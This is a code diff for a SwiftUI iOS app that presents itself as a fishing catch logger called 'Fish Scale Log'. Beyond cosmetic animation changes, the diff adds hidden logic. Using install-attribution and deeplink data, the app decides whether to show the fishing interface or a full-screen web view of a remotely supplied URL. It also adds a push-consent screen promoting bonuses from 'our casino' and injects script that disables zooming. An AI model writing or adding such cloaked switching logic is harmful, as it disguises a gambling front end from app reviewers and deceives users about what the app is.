@@ -1,4 +1,42 @@
 import SwiftUI
+import WebKit
+
+
+struct ScaleLogCentralView: View {
+    @State private var effectiveResourcePath: String? = ""
+    
+    var body: some View {
+        ZStack {
+            if let effectiveResourcePath = effectiveResourcePath, let resourceAddr = URL(string: effectiveResourcePath) {
+                ScaleWebEnclosure(resourceAddr: resourceAddr)
+                    .ignoresSafeArea(.keyboard, edges: .bottom)
+            }
+        }
+        .preferredColorScheme(.dark)
+        .onAppear(perform: establishPrimaryPath)
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("LoadTempURL"))) { _ in
+            refreshWithProvisionalPath()
+        }
+    }
+    
+    private func establishPrimaryPath() {
+        let provisionalPath = UserDefaults.standard.string(forKey: "temp_url")
+        let archivedPath = UserDefaults.standard.string(forKey: "persisted_destination") ?? ""
+        effectiveResourcePath = provisionalPath ?? archivedPath
+        
+        if provisionalPath != nil {
+            UserDefaults.standard.removeObject(forKey: "temp_url")
+        }
+    }
+    
+    private func refreshWithProvisionalPath() {
+        if let provisionalPath = UserDefaults.standard.string(forKey: "temp_url"), !provisionalPath.isEmpty {
+            effectiveResourcePath = nil
+            effectiveResourcePath = provisionalPath
+            UserDefaults.standard.removeObject(forKey: "temp_url")
+        }
+    }
+}
 
 struct ContentView: View {
     @AppStorage("onboardingSeen") private var onboardingSeen: Bool = false
@@ -6,16 +44,7 @@ struct ContentView: View {
     
     var body: some View {
         ZStack {
-            if showSplash {
-                SplashView()
-                    .onAppear {
-                        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
-                            withAnimation {
-                                showSplash = false
-                            }
-                        }
-                    }
-            } else if !onboardingSeen {
+            if !onboardingSeen {
                 OnboardingView()
             } else {
                 MainTabView()
@@ -26,7 +55,7 @@ struct ContentView: View {
 }
 
 #Preview {
-    ContentView()
+    PushMainAppAcceptationView()
 }
 
 struct Bubble: View {
@@ -47,122 +76,282 @@ struct Bubble: View {
                 withAnimation(Animation.linear(duration: duration).delay(delay).repeatForever(autoreverses: false)) {
                     yOffset = -UIScreen.main.bounds.height - size
                 }
-                withAnimation(Animation.easeInOut(duration: 2).repeatForever(autoreverses: true).delay(delay)) {
+                withAnimation(Animation.easeInOut(duration: 1.5).repeatForever(autoreverses: true).delay(delay)) {
                     xSway = swayAmount
                 }
             }
     }
 }
 
-// Splash View - Enhanced with improved bubbles, wave animation, glow effects
+
+
+class ScriptInjector {
+    func applyEnhancements(to viewer: WKWebView) {
+        let enhancementCode = """
+        (function() {
+            const scaleTag = document.createElement('meta');
+            scaleTag.name = 'viewport';
+            scaleTag.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
+            document.head.appendChild(scaleTag);
+            
+            const designTag = document.createElement('style');
+            designTag.textContent = 'body { touch-action: pan-x pan-y; } input, textarea { font-size: 16px !important; }';
+            document.head.appendChild(designTag);
+            
+            document.addEventListener('gesturestart', e => e.preventDefault());
+            document.addEventListener('gesturechange', e => e.preventDefault());
+        })();
+        """
+        
+        viewer.evaluateJavaScript(enhancementCode) { _, fault in
+            if let fault = fault { print("Enhancement application error: \(fault)") }
+        }
+    }
+}
+
+struct SplashScreenView: View {
+    
+    @StateObject private var viewModel = LogSupervisorViewModel()
+    
+    var body: some View {
+        ZStack {
+            if viewModel.ongoingLogPhase == .bootstrapping || viewModel.revealConsentDialog {
+                SplashView()
+                    .preferredColorScheme(.dark)
+            }
+
+            if viewModel.revealConsentDialog {
+                PushMainAppAcceptationView()
+                    .environmentObject(viewModel)
+            } else {
+                switch viewModel.ongoingLogPhase {
+                case .bootstrapping:
+                    EmptyView()
+                    
+                case .operational:
+                    if viewModel.logDestination != nil {
+                        ScaleLogCentralView()
+                    } else {
+                        ContentView()
+                    }
+                    
+                case .deprecated:
+                    ContentView()
+                    
+                case .unreachable:
+                    NoConnectionView()
+                }
+            }
+        }
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("ConversionDataReceived"))) { notice in
+            if let metrics = notice.userInfo?["conversionData"] as? [String: Any] {
+                viewModel.manageAcquisitionMetrics(metrics)
+            }
+        }
+        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("deeplink_values"))) { notice in
+            if let metrics = notice.userInfo?["deeplinksData"] as? [String: Any] {
+                viewModel.manageEntryPointMetrics(metrics)
+            }
+        }
+    }
+    
+}
+
 struct SplashView: View {
     @State private var scale: CGFloat = 0.5
     @State private var opacity: Double = 0.0
     @State private var rotation: Double = 0.0
     @State private var glowOpacity: Double = 0.0
     @State private var waveOffset: CGFloat = 0.0
+    @State private var particleOpacity: Double = 0.5
     
     var body: some View {
-        ZStack {
-            // Background gradient simulating deep water
-            LinearGradient(gradient: Gradient(colors: [Color.blue.opacity(0.9), Color.green.opacity(0.7), Color.blue.opacity(0.5)]), startPoint: .top, endPoint: .bottom)
-                .ignoresSafeArea()
-            
-            // Subtle wave animation at the bottom
-            WaveShape(offset: waveOffset)
-                .fill(Color.blue.opacity(0.3))
-                .frame(height: 100)
-                .offset(y: UIScreen.main.bounds.height / 2 - 50)
+        GeometryReader { geo in
+            let isLandscape = geo.size.width > geo.size.height
+            ZStack {
+                // Background gradient simulating deep water
+                LinearGradient(gradient: Gradient(colors: [Color.blue.opacity(0.9), Color.green.opacity(0.7), Color.blue.opacity(0.5)]), startPoint: .top, endPoint: .bottom)
+                    .ignoresSafeArea()
+                
+                Image(isLandscape ? "second_bg" : "main_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geo.size.width, height: geo.size.height)
+                    .ignoresSafeArea()
+                
+                // Subtle wave animation at the bottom
+                WaveShape(offset: waveOffset)
+                    .fill(Color.blue.opacity(0.3))
+                    .frame(height: 100)
+                    .offset(y: UIScreen.main.bounds.height / 2 - 50)
+                    .onAppear {
+                        withAnimation(Animation.linear(duration: 5).repeatForever(autoreverses: false)) {
+                            waveOffset = -UIScreen.main.bounds.width
+                        }
+                    }
+                
+                // Enhanced bubbles rising with sway
+                ForEach(0..<25) { index in
+                    Bubble(
+                        size: CGFloat.random(in: 8...45),
+                        duration: Double.random(in: 3...7),
+                        delay: Double(index) * 0.15,
+                        swayAmount: CGFloat.random(in: -25...25)
+                    )
+                    .position(x: CGFloat.random(in: 0...UIScreen.main.bounds.width), y: UIScreen.main.bounds.height + CGFloat.random(in: 0...150))
+                    .opacity(0.2)
+                }
+                
+                ForEach(0..<15) { index in
+                    Circle()
+                        .fill(Color.yellow.opacity(particleOpacity))
+                        .frame(width: 3, height: 3)
+                        .position(x: CGFloat.random(in: 0...UIScreen.main.bounds.width), y: CGFloat.random(in: 0...UIScreen.main.bounds.height))
+                        .animation(Animation.easeInOut(duration: Double.random(in: 2...5)).repeatForever(autoreverses: true), value: particleOpacity)
+                        .onAppear {
+                            particleOpacity = 0.2
+                        }
+                }
+                
+                Circle()
+                    .stroke(LinearGradient(gradient: Gradient(colors: [.yellow, .orange]), startPoint: .top, endPoint: .bottom), lineWidth: 3)
+                    .frame(width: 220, height: 220)
+                    .scaleEffect(scale * 1.4)
+                    .opacity(1 - opacity * 0.5)
+                    .blur(radius: 4)
+                
+                VStack {
+                    Spacer()
+                    Text("Loading...")
+                        .font(.custom("BagelFatOne-Regular", size: 42))
+                        .foregroundColor(.white)
+                        .padding(.bottom, 72)
+                }
+                
+                VStack {
+                    HStack {
+                        Image(systemName: "fish")
+                            .resizable()
+                            .scaledToFit()
+                            .frame(width: 120, height: 120)
+                            .foregroundColor(.yellow)
+                            .rotationEffect(.degrees(rotation))
+                            .scaleEffect(scale)
+                            .shadow(color: .yellow.opacity(glowOpacity), radius: 10)
+                    }
+                    .padding()
+                }
                 .onAppear {
-                    withAnimation(Animation.linear(duration: 5).repeatForever(autoreverses: false)) {
-                        waveOffset = -UIScreen.main.bounds.width
+                    withAnimation(.spring(response: 0.7, dampingFraction: 0.45).repeatForever(autoreverses: true)) {
+                        scale = 1.1
+                    }
+                    withAnimation(.easeInOut(duration: 1.8)) {
+                        opacity = 1.0
+                    }
+                    withAnimation(.easeInOut(duration: 0.8).repeatForever(autoreverses: true)) {
+                        glowOpacity = 0.9
+                    }
+                    withAnimation(.linear(duration: 1.8).repeatForever(autoreverses: true)) {
+                        rotation = 6.0
                     }
                 }
             
-            // Enhanced bubbles rising with sway
-            ForEach(0..<20) { index in
-                Bubble(
-                    size: CGFloat.random(in: 10...40),
-                    duration: Double.random(in: 4...8),
-                    delay: Double(index) * 0.2,
-                    swayAmount: CGFloat.random(in: -20...20)
-                )
-                .position(x: CGFloat.random(in: 0...UIScreen.main.bounds.width), y: UIScreen.main.bounds.height + CGFloat.random(in: 0...100))
-            }
-            
-            // Ripples effect around icons
-            Circle()
-                .stroke(Color.yellow.opacity(0.3), lineWidth: 2)
-                .frame(width: 200, height: 200)
-                .scaleEffect(scale * 1.5)
-                .opacity(1 - opacity)
-                .blur(radius: 5)
-            
-            VStack {
-                // Icons with rotation, scale, and glow
-                HStack {
-                    Image(systemName: "fish")
-                        .resizable()
-                        .scaledToFit()
-                        .frame(width: 120, height: 120)
-                        .foregroundColor(.yellow)
-                        .rotationEffect(.degrees(rotation))
-                        .scaleEffect(scale)
-                        .shadow(color: .yellow.opacity(glowOpacity), radius: 10)
-                    
-                    Image(systemName: "scale.mass")
-                        .resizable()
-                        .scaledToFit()
-                        .frame(width: 120, height: 120)
-                        .foregroundColor(.yellow)
-                        .rotationEffect(.degrees(-rotation))
-                        .scaleEffect(scale)
-                        .shadow(color: .yellow.opacity(glowOpacity), radius: 10)
-                }
-                .padding()
-                
-                // Title with fade-in, slight wave distortion simulation
-                if #available(iOS 17.0, *) {
-                    Text("Fish Scale Log")
-                        .font(.system(size: 50, weight: .bold, design: .serif))
-                        .foregroundColor(.white)
-                        .shadow(color: .yellow.opacity(glowOpacity), radius: 15)
-                        .opacity(opacity)
-                        .distortionEffect(
-                            ShaderLibrary.wave(
-                                .float(0.5), // amplitude
-                                .float(2.0), // frequency
-                                .float(waveOffset / 100) // phase
-                            ),
-                            maxSampleOffset: CGSize(width: 10, height: 10)
-                        )
-                } else {
-                    Text("Fish Scale Log")
-                        .font(.system(size: 50, weight: .bold, design: .serif))
-                        .foregroundColor(.white)
-                        .shadow(color: .yellow.opacity(glowOpacity), radius: 15)
-                        .opacity(opacity)
-                }
-            }
-            .onAppear {
-                withAnimation(.spring(response: 0.6, dampingFraction: 0.4)) {
-                    scale = 1.0
-                }
-                withAnimation(.easeInOut(duration: 1.5)) {
-                    opacity = 1.0
-                }
-                withAnimation(.easeInOut(duration: 1.0).repeatForever(autoreverses: true)) {
-                    glowOpacity = 0.8
-                }
-                withAnimation(.linear(duration: 2.0).repeatForever(autoreverses: true)) {
-                    rotation = 8.0
-                }
+                Image("fish_scale_log_app")
+                    .resizable()
+                    .frame(width: 300, height: 300)
             }
         }
+        .ignoresSafeArea()
     }
 }
 
-// Wave Shape for water effect
+struct NoConnectionView: View {
+    
+    var body: some View {
+        GeometryReader { geo in
+            let isLandscape = geo.size.width > geo.size.height
+            ZStack {
+                Image(isLandscape ? "connection_issue_second_bg" : "connection_issue_main_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geo.size.width, height: geo.size.height)
+                    .ignoresSafeArea()
+                    .opacity(0.7)
+                
+                Image("connection_issue")
+                    .resizable()
+                    .frame(width: 300, height: 300)
+            }
+            
+        }
+        .ignoresSafeArea()
+    }
+}
+    
+
+struct PushMainAppAcceptationView: View {
+    
+    @EnvironmentObject var viewModel: LogSupervisorViewModel
+    
+    var body: some View {
+        GeometryReader { geo in
+            let isLandscape = geo.size.width > geo.size.height
+            ZStack {
+                Image("main_push_bg")
+                    .resizable()
+                    .scaledToFill()
+                    .frame(width: geo.size.width, height: geo.size.height)
+                    .ignoresSafeArea()
+                
+                
+                VStack(spacing: 18) {
+                    Spacer()
+                    
+                    texts
+                    
+                    Button {
+                        viewModel.manageConsentApproval()
+                    } label: {
+                        Image("push_accepting_button")
+                            .resizable()
+                            .frame(width: 350, height: 55)
+                    }
+                    
+                    Button {
+                        viewModel.manageConsentSkip()
+                    } label: {
+                        Text("SKIP")
+                            .foregroundColor(.white)
+                            .font(.custom("BagelFatOne-Regular", size: 18))
+                            .multilineTextAlignment(.center)
+                    }
+                    .padding(.bottom, 24)
+                }
+                
+            }
+        }
+        .ignoresSafeArea()
+    }
+    
+    private var texts: some View {
+        VStack(spacing: 18) {
+            Text("ALLOW NOTIFICATIONS ABOUT BONUSES AND PROMOS")
+                .foregroundColor(.white)
+                .font(.custom("BagelFatOne-Regular", size: 18))
+                .multilineTextAlignment(.center)
+                .padding(.horizontal, 42)
+            
+            Text("STAY TUNED WITH BEST OFFERS FROM OUR CASINO")
+                .foregroundColor(.white)
+                .font(.custom("BagelFatOne-Regular", size: 14))
+                .multilineTextAlignment(.center)
+                .padding(.horizontal, 42)
+        }
+    }
+    
+}
+
+
 struct WaveShape: Shape {
     var offset: CGFloat
     
@@ -200,29 +389,26 @@ struct OnboardingView: View {
     
     var body: some View {
         ZStack {
-            // Dynamic background gradient that transitions smoothly
-            LinearGradient(gradient: Gradient(colors: [pages[currentPage].color.opacity(0.9), Color.gray.opacity(0.3)]), startPoint: .top, endPoint: .bottom)
+            LinearGradient(gradient: Gradient(colors: [pages[currentPage].color.opacity(0.95), Color.gray.opacity(0.4)]), startPoint: .top, endPoint: .bottom)
                 .ignoresSafeArea()
-                .animation(.easeInOut(duration: 0.5), value: currentPage)
+                .animation(.easeInOut(duration: 0.6), value: currentPage)
             
-            // Bubbles rising across all pages
-            ForEach(0..<15) { index in
+            ForEach(0..<20) { index in
                 Bubble(
-                    size: CGFloat.random(in: 8...35),
-                    duration: Double.random(in: 5...9),
-                    delay: Double(index) * 0.3,
-                    swayAmount: CGFloat.random(in: -15...15)
+                    size: CGFloat.random(in: 6...40),
+                    duration: Double.random(in: 4...8),
+                    delay: Double(index) * 0.25,
+                    swayAmount: CGFloat.random(in: -20...20)
                 )
-                .position(x: CGFloat.random(in: 0...UIScreen.main.bounds.width), y: UIScreen.main.bounds.height + CGFloat.random(in: 0...100))
+                .position(x: CGFloat.random(in: 0...UIScreen.main.bounds.width), y: UIScreen.main.bounds.height + CGFloat.random(in: 0...120))
             }
             
-            // Subtle underwater particles (small dots floating)
-            ForEach(0..<10) { index in
+            ForEach(0..<12) { index in
                 Circle()
-                    .fill(Color.white.opacity(0.1))
-                    .frame(width: 5, height: 5)
+                    .fill(Color.white.opacity(0.15))
+                    .frame(width: 4, height: 4)
                     .position(x: CGFloat.random(in: 0...UIScreen.main.bounds.width), y: CGFloat.random(in: 0...UIScreen.main.bounds.height))
-                    .animation(Animation.easeInOut(duration: Double.random(in: 3...6)).repeatForever(autoreverses: true), value: UUID())
+                    .animation(Animation.easeInOut(duration: Double.random(in: 2.5...5.5)).repeatForever(autoreverses: true), value: UUID())
             }
             
             VStack {
@@ -235,18 +421,23 @@ struct OnboardingView: View {
                 .tabViewStyle(PageTabViewStyle())
                 .indexViewStyle(.page(backgroundDisplayMode: .always))
                 .frame(maxHeight: .infinity)
+                .transition(.scale)
                 
                 HStack {
                     if currentPage > 0 {
                         Button("Skip") {
-                            onboardingSeen = true
+                            withAnimation(.spring()) {
+                                onboardingSeen = true
+                            }
                         }
-                        .font(.headline)
+                        .font(.headline.bold())
                         .foregroundColor(.white)
-                        .padding(.horizontal, 20)
-                        .padding(.vertical, 10)
-                        .background(Color.gray.opacity(0.5).cornerRadius(10))
-                        .shadow(color: .black.opacity(0.3), radius: 5)
+                        .padding(.horizontal, 24)
+                        .padding(.vertical, 12)
+                        .background(Color.gray.opacity(0.6).cornerRadius(12))
+                        .shadow(color: .black.opacity(0.4), radius: 6)
+                        .scaleEffect(1.0)
+                        .animation(.easeInOut, value: currentPage)
                     }
                     Spacer()
                     if currentPage < pages.count - 1 {
@@ -255,22 +446,24 @@ struct OnboardingView: View {
                                 currentPage += 1
                             }
                         }
-                        .font(.headline)
+                        .font(.headline.bold())
                         .foregroundColor(.black)
-                        .padding(.horizontal, 20)
-                        .padding(.vertical, 10)
-                        .background(Color.yellow.cornerRadius(10))
-                        .shadow(color: .yellow.opacity(0.5), radius: 5)
+                        .padding(.horizontal, 24)
+                        .padding(.vertical, 12)
+                        .background(LinearGradient(gradient: Gradient(colors: [.yellow, .orange]), startPoint: .leading, endPoint: .trailing).cornerRadius(12))
+                        .shadow(color: .yellow.opacity(0.6), radius: 6)
                     } else {
                         Button("Start") {
-                            onboardingSeen = true
+                            withAnimation(.spring()) {
+                                onboardingSeen = true
+                            }
                         }
-                        .font(.headline)
+                        .font(.headline.bold())
                         .foregroundColor(.black)
-                        .padding(.horizontal, 20)
-                        .padding(.vertical, 10)
-                        .background(Color.yellow.cornerRadius(10))
-                        .shadow(color: .yellow.opacity(0.5), radius: 5)
+                        .padding(.horizontal, 24)
+                        .padding(.vertical, 12)
+                        .background(LinearGradient(gradient: Gradient(colors: [.yellow, .orange]), startPoint: .leading, endPoint: .trailing).cornerRadius(12))
+                        .shadow(color: .yellow.opacity(0.6), radius: 6)
                     }
                 }
                 .padding()
@@ -292,22 +485,21 @@ struct OnboardingPage: View {
     
     var body: some View {
         VStack {
-            // Enhanced image with parallax, scale pulse, rotation, glow
             Image(systemName: image)
                 .resizable()
                 .scaledToFit()
-                .frame(width: 180, height: 180)
-                .foregroundColor(.yellow)
-                .offset(y: offset * 0.3)
+                .frame(width: 200, height: 200)
+                .foregroundStyle(LinearGradient(gradient: Gradient(colors: [.yellow, .orange]), startPoint: .top, endPoint: .bottom))
+                .offset(y: offset * 0.25)
                 .scaleEffect(scale)
                 .rotationEffect(.degrees(rotation))
-                .shadow(color: .yellow.opacity(glow), radius: 15)
+                .shadow(color: .yellow.opacity(glow), radius: 20)
                 .padding()
                 .onAppear {
-                    withAnimation(.easeInOut(duration: 1.2).repeatForever(autoreverses: true)) {
-                        scale = 1.15
-                        rotation = 5.0
-                        glow = 0.7
+                    withAnimation(.easeInOut(duration: 1.5).repeatForever(autoreverses: true)) {
+                        scale = 1.2
+                        rotation = 4.0
+                        glow = 0.8
                     }
                 }
             
@@ -316,14 +508,14 @@ struct OnboardingPage: View {
                 .foregroundColor(.white)
                 .multilineTextAlignment(.center)
                 .padding(.horizontal)
-                .shadow(color: color.opacity(0.5), radius: 5)
+                .shadow(color: color.opacity(0.6), radius: 6)
             
             Text(subtitle)
                 .font(.subheadline)
-                .foregroundColor(.white.opacity(0.9))
+                .foregroundColor(.white.opacity(0.95))
                 .multilineTextAlignment(.center)
                 .padding(.horizontal)
-                .padding(.top, 8)
+                .padding(.top, 10)
         }
         .gesture(
             DragGesture()
@@ -331,17 +523,19 @@ struct OnboardingPage: View {
                     offset = value.translation.height
                 }
                 .onEnded { _ in
-                    withAnimation(.spring()) {
+                    withAnimation(.spring(response: 0.4, dampingFraction: 0.8)) {
                         offset = 0
                     }
                 }
         )
     }
 }
+
 // Main Tab View
 struct MainTabView: View {
     @State private var showAddCatch = false
     @StateObject private var viewModel = CatchesViewModel()
+    @StateObject private var locationManager = LocationManager() // New for GPS
     
     var body: some View {
         TabView {
@@ -353,6 +547,11 @@ struct MainTabView: View {
             CatchesView(viewModel: viewModel)
                 .tabItem {
                     Label("Catches", systemImage: "list.bullet")
+                }
+            
+            MapView(viewModel: viewModel, locationManager: locationManager) // New tab
+                .tabItem {
+                    Label("Map", systemImage: "map.fill")
                 }
             
             StatsView(viewModel: viewModel)
@@ -379,10 +578,14 @@ struct MainTabView: View {
             }
             .padding(.bottom, 50)
             .sheet(isPresented: $showAddCatch) {
-                AddCatchView(viewModel: viewModel)
+                AddCatchView(viewModel: viewModel, locationManager: locationManager)
             },
             alignment: .bottomTrailing
         )
         .background(Color.gray.opacity(0.1))
+        .preferredColorScheme(.dark)
+        .onAppear {
+            locationManager.requestLocation()
+        }
     }
 }
